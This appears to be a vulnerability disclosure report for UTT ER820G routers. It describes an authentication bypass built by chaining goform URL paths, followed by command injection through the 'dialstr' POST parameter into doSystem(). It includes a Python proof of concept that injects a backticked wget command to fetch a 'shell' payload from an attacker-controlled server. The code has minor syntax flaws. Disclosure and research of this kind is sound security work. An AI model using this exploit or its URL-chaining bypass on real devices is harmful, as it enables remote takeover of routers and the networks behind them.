

# CVE Report - Authentication Bypass and Command Injection Vulnerability in UTT ER820G  Routers 

## Vulnerability Title

Authentication Bypass and Command Injection Vulnerability in UTT ER820G  Routers 

## Vulnerability Description

UTT ER820G devices have an authentication bypass and command injection vulnerability in the `sub_43AD04` function, which allows remote attackers to execute arbitrary commands via parameter `dialstr` passed to the binary through a POST request.

## POC

```py
import requests
import sys

def cmd_injection(url):
    cmd='dialstr=`wget http://{server_ip}:{server_port}/shell`'
    resp=requests.post(url,data=cmd,verify=False,timeout=3)

try:
    url=f'http://{target_ip}:{target_port}/goform/formDia/goform/formWebAuthUserSubmit')
    try:
        cmd_injection(url)
        print('[%s]'%sys.argv[1]+'  success!')
    except:
        print('[%s]'%sys.argv[1]+'  failed!')
except:
    print('usage: python cmd_injection.py')
```



## Cause Analysis

1. **authentication** :In the authentication logic of websSecurityHandler, URLs containing the substrings /goform/formWebAuthUserSubmit and /goform/formWebAuthOk can directly access the handler in websFormHandler.  Since the handler being sought is the one corresponding to the second field, a URL like /goform/setSysAdm/goform/formWebAuthUserSubmit can be constructed to bypass authentication.

   ![image-20260123093026885](C:\Users\XiaoA\AppData\Roaming\Typora\typora-user-images\image-20260123093026885.png)

![image-20260123104319732](C:\Users\XiaoA\AppData\Roaming\Typora\typora-user-images\image-20260123104319732.png)

2. **command injection:** In the `sub_43AD04` function, user-supplied data is obtained from the HTTP request parameter `dialstr` through the `websGetVar` function and stored in the `Var` variable. The `Var` is then directly passed to several `doSystem()` calls that execute shell commands, thus causing a command injection vulnerability.

![image-20260128163136416](C:\Users\XiaoA\AppData\Roaming\Typora\typora-user-images\image-20260128163136416.png)

